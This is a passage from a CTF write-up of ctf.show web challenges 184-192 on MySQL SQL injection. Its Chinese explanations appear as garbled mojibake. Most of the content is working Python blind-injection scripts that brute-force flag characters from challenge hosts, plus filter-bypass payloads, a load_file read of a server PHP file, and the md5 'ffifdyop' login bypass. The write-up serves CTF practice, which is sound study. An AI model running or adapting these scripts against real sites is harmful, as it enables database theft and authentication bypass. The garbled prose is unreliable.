class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-01-12 01:16:02</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-12 03:50:33</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¯ç§’å‘é€ä¸è¶…è¿‡5ä¸ªè¯·æ±‚</span></span><br><span class="line"><span class="comment"># mysql å®˜æ–¹æ–‡æ¡£ https://dev.mysql.com/doc/refman/5.7/en/replication.html 5.7ç‰ˆæœ¬çš„</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f279fb00-070d-4b47-a72f-0f1a82f2e84a.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line"><span class="comment">#flagstr = &quot;&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">a = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">a += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x))</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;0x&quot;</span>+a.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#63746673686f777b</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">formatString</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line"></span><br><span class="line">temp = <span class="string">&quot;concat(&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">temp +=char2boolean(x)</span><br><span class="line"><span class="keyword">return</span> temp[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">char2boolean</span>(<span class="params">ch</span>):</span><br><span class="line">num = <span class="built_in">ord</span>(ch)</span><br><span class="line">temp = <span class="string">&quot;char(&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">temp +=<span class="string">&quot;true+&quot;</span></span><br><span class="line"><span class="keyword">return</span> temp[:-<span class="number">1</span>]+<span class="string">&quot;),&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;55eff0b8-fa84-4ee8-9cd2-4e84cdd78b73&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">flag=<span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass regexp(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(formatString(flag+x))</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="keyword">if</span> response.text.find(<span class="string">&quot;user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++=&#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">flag+=x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++=&#123;&#125; is wrong&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++=&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20221229221701321.png" alt="image-20221229221701321"></p><p>ä»£ç ä¸­çš„charæ˜¯è´Ÿè´£è½¬æ¢å­—ç¬¦ç”¨çš„ï¼Œç„¶åconcatæ˜¯è¿æ¥å­—ç¬¦ç”¨çš„ã€‚charè½¬æ¢é‡Œçš„å†…å®¹æ˜¯asciiçš„10è¿›åˆ¶ã€‚</p><h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><p>æºç </p><p><img src="../images/image-20221229221947989.png" alt="image-20221229221947989"></p><p>è¿™é“é¢˜å¤šè¿‡æ»¤äº†&lt;&gt;  å’Œx00  ä½†æ˜¯è¿˜æ˜¯å¯ä»¥ä¸Šä¸€é¢˜çš„è„šæœ¬æ¥å†™ã€‚</p><p><img src="../images/image-20221229222842518.png" alt="image-20221229222842518"></p><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>æºç </p><p><img src="../images/image-20221229222936006.png" alt="image-20221229222936006"></p><p><img src="../images/image-20221229224301702.png" alt="image-20221229224301702"></p><p>ä»¥ä¸‹å†…å®¹æ‘˜è‡ª   <a href="https://blog.csdn.net/m0_48780534/article/details/126155600">https://blog.csdn.net/m0_48780534/article/details/126155600</a></p><p>â€‹           æœ¬é¢˜å’Œweb181ç±»ä¼¼ï¼Œéƒ½æ˜¯é€šè¿‡<code>1 and 0 or 1</code>è¾¾åˆ°ç›®çš„ã€‚</p><p>â€‹         è¿™é‡Œçš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œå¹¶ä¸æ˜¯æŒ‡è½¬æˆ0101ï¼Œè€Œæ˜¯binary modeã€‚</p><p><img src="../images/image-20221229224630236.png" alt="image-20221229224630236"></p><p><img src="../images/image-20221229224640893.png" alt="image-20221229224640893"></p><p>å°±æ˜¯è¿™æ ·çš„æ ¼å¼ã€‚</p><p>é‚£ä¹ˆè¿™é“é¢˜å°±å¾—ç”¨åˆ°è¿™ä¸ªç»è¿‡md5(<strong>ffifdyop</strong>)åŠ å¯†è¿‡åçš„ä¸œè¥¿ï¼Œé‡Œé¢è¿™æ®µè‹±æ–‡è§£æä¹‹åå°±æ˜¯ä¸Šå›¾æ‰€ç¤ºï¼Œå’Œä¸‡èƒ½å¯†ç å·®ä¸å¤šã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from ctfshow_user where username = &#x27;admin&#x27; and password= &#x27;&#x27;or&#x27;6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b&#x27;;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°±ä¼šå˜æˆ1 and 0 or 1   çš„æƒ…å†µï¼Œé‚£ä¹ˆæœ€åç»“æœå°±æ˜¯  1ã€‚</p><p><img src="../images/image-20221229225158366.png" alt="image-20221229225158366"></p><p><img src="../images/image-20221229225309316.png" alt="image-20221229225309316"></p><p>å°±æ˜¯ç±»ä¼¼è¿™ç§æ•ˆæœã€‚åªè¦ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯æ•°å­—ä¸æ˜¯å­—æ¯å°±è¡Œã€‚</p><p><img src="../images/image-20221229225514311.png" alt="image-20221229225514311"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count(*)  ----&gt;æŒ‡çš„æ˜¯æ•°æ®åº“æ€»è¡Œæ•°</span><br></pre></td></tr></table></figure><h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>æºç </p><p><img src="../images/image-20221229230058797.png" alt="image-20221229230058797"></p><p><strong>è¿™é‡Œçš„è€ƒæ³•æ˜¯mysqlçš„å¼±ç±»å‹æ¯”è¾ƒã€‚</strong></p><p><img src="../images/image-20221229230659047.png" alt="image-20221229230659047"></p><p><img src="../images/image-20221229230716625.png" alt="image-20221229230716625"></p><p>è¿™é‡Œèƒ½çˆ†å‡ºæ¥çš„åŸå› æ˜¯å› ä¸ºusernameçš„å€¼æ²¡æœ‰ç”¨  â€˜â€™   åŒ…å«èµ·æ¥ï¼Œé‚£ä¹ˆusernameçš„å€¼å°±ä¸º0ï¼Œæ•°æ®åº“ä¸­usernameæ˜¯å­—æ¯å¼€å¤´çš„è¯ï¼Œå€¼ä¹Ÿä¸º0.é‚£ä¹ˆå°±å¯ä»¥æŠŠè¿™äº›å…¨éƒ¨ç»™çˆ†å‡ºæ¥äº†ã€‚</p><p><img src="../images/image-20221229230926512.png" alt="image-20221229230926512"></p><p>è¿™ä¸ªèƒ½çˆ†å‡ºçš„åŸå› æ˜¯è¿™ä¸ªçš„usernameä¸º1abï¼Œè½¬æ¢è¿‡æ¥çš„è¯å€¼æ˜¯ä¸º1çš„ã€‚é‚£ä¹ˆå°±å¯ä»¥çˆ†å‡ºå€¼ä¸º1çš„password.</p><p><img src="../images/image-20221229231221101.png" alt="image-20221229231221101"></p><p>usernameå’Œpasswordéƒ½ç”¨0çš„åŸå› æ˜¯ï¼Œä¸¤ä¸ªifåˆ¤æ–­éƒ½ä¸ºå¼±ç±»å‹æ¯”è¾ƒï¼Œ<strong>0éƒ½ä¼šç­‰äºå­—æ¯å¼€å¤´çš„å­—ç¬¦ä¸²</strong></p><p>å°±æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæ‹¿åˆ°äº†flagã€‚</p><h2 id="web189-boolç›²æ³¨"><a href="#web189-boolç›²æ³¨" class="headerlink" title="web189(boolç›²æ³¨)"></a>web189(boolç›²æ³¨)</h2><p>æºç </p><p><img src="../images/image-20221229231806534.png" alt="image-20221229231806534"></p><p>å’Œä¸Šä¸€é¢˜çš„å†…å®¹ä¸€æ ·ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagåœ¨api/index.phpæ–‡ä»¶ä¸­     ----&gt;  ç»™çš„æç¤º</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹ç™»å½•çš„è¿”å›æƒ…å†µæœ‰æ²¡æœ‰å·®åˆ«ï¼š<br>username=0ã€password=0æ—¶ï¼Œè¿”å›â€œå¯†ç é”™è¯¯â€ã€‚ï¼ˆè¯´æ˜å­˜åœ¨ç”¨æˆ·ï¼Œä½†æ˜¯å¯†ç é”™è¯¯ï¼‰<br>username=1ã€password=0æ—¶ï¼Œè¿”å›â€œæŸ¥è¯¢å¤±è´¥â€ã€‚ï¼ˆè¯´æ˜ç”¨æˆ·ä¸å­˜åœ¨ï¼‰</p><p>å› ä¸ºè¾“å…¥0  å’Œ 1è¿”å›çš„ç»“æœä¸åŒï¼ŒåŠ ä¸Šè¿‡æ»¤äº†è”åˆæ³¨å…¥éœ€è¦çš„ä¸œè¥¿ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—è€ƒè™‘boolç›²æ³¨çš„é—®é¢˜äº†ã€‚</p><p><strong>ç¾¤ä¸»å†™çš„è„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dc02940d-e22b-4796-ab0f-04bdf57d3a9f.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;&lt;&gt;$=,;_ &#x27;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#è¿™ä¸ªä½ç½®ï¼Œæ˜¯ç¾¤ä¸»è€—è´¹å¾ˆé•¿æ—¶é—´è·‘å‡ºæ¥çš„ä½ç½®~</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>,<span class="number">257</span>+<span class="number">60</span>):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="string">&quot;if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)&quot;</span>.<span class="built_in">format</span>(i,x),</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">response = requests.post(url,data=data)</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="keyword">if</span> response.text.find(<span class="string">&quot;8d25&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="comment">#8d25æ˜¯usernameç­‰äº1æ—¶è¿”å›çš„ä¸œè¥¿ï¼Œ0è¿”å›æ—¶çš„ä¸œè¥¿ä¸æ˜¯8d25.</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">flag+=x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>dataé‡Œçš„æ„æ€æ˜¯ï¼Œå¦‚æœè¿”å›çš„å€¼é‡Œçš„ç¬¬nä½ä¸å­—ç¬¦ä¸²é‡Œçš„æŸä½ç›¸ç­‰ï¼Œåˆ™è¿”å›1</p><p><img src="../images/image-20221230165849922.png" alt="image-20221230165849922"></p><h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><p>æºç </p><p><img src="../images/image-20221230205113908.png" alt="image-20221230205113908"></p><p>è¿™é“é¢˜ç»™äº†ä¸ªæç¤ºè¯´æ˜¯boolç›²æ³¨</p><p><img src="../images/image-20221230205237454.png" alt="image-20221230205237454"></p><p>æç¤ºå¯†ç é”™è¯¯ã€‚</p><p><img src="../images/image-20221230205303277.png" alt="image-20221230205303277"></p><p>è¾“å…¥åˆ«çš„æç¤ºç”¨æˆ·åä¸å­˜åœ¨ï¼Œæ‰€ä»¥å¯ä»¥å¾—å‡ºç”¨æˆ·åå¤„å­˜åœ¨sqlæ³¨å…¥ã€‚è¿™é¢˜æ²¡æœ‰è¿‡æ»¤å­—ç¬¦ï¼Œé‚£ä¹ˆç›´æ¥ç”¨ç¾¤ä¸»å†™çš„äºŒåˆ†æ³•è„šæœ¬æ¥è·‘å°±è¡Œäº†ã€‚(ä»¥åé‡åˆ°boolç›²æ³¨çš„é¢˜ï¼Œå¯ä»¥ä¿®æ”¹è„šæœ¬ä¸€ä¸‹ç›´æ¥ç”¨å°±è¡Œäº†)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-12 05:48:30</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1429d815-6439-47de-ab04-5782a8bbf349.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == mid):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;77de2af3-6f34-4d20-adc7-8aba40a40ffe&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><p>æºç </p><p><img src="../images/image-20221230205641079.png" alt="image-20221230205641079"></p><p>è¿™é¢˜ç›¸è¾ƒä¸Šé¢˜è€Œè¨€ï¼Œå¢åŠ äº†è¿‡æ»¤ã€‚ä½†æ˜¯å½±å“ä¸å¤§ï¼ŒæŠŠweb190çš„è„šæœ¬æ‹¿æ¥ä¿®æ”¹ä¸€ä¸‹å°±å¥½äº†ã€‚</p><p><img src="../images/image-20221230210418369.png" alt="image-20221230210418369"></p><p>è¿™ä¸¤ä¸ªå‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œå¯ä»¥æ›¿æ¢ç€æ¥ç”¨</p><p>ä¿®æ”¹åçš„wpè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-12 05:48:30</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://86c12830-4c24-41b4-bf71-64e3ad3646d1.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == mid):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and (ord(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;77de2af3-6f34-4d20-adc7-8aba40a40ffe&#125;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ord()æ¥æ›¿æ¢ã€‚</p><h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><p>æºç </p><p><img src="../images/image-20221230212728629.png" alt="image-20221230212728629"></p><p>è¿™é‡Œæ˜¯æŠŠordå’Œasciiéƒ½ç»™è¿‡æ»¤æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘ä¸ç”¨ç¼–ç æˆæ•°å­—çš„å½¢å¼æ¥è§£é¢˜ï¼Œå¯ä»¥ç›´æ¥éå†å­—ç¬¦ä¸²æ¥çœ‹æ˜¯å¦ç›¸ç­‰ã€‚</p><p>ç¾¤ä¸»å†™çš„wpè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-14 00:52:03</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://053d8c7a-d802-48ae-836c-d60f4a832555.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            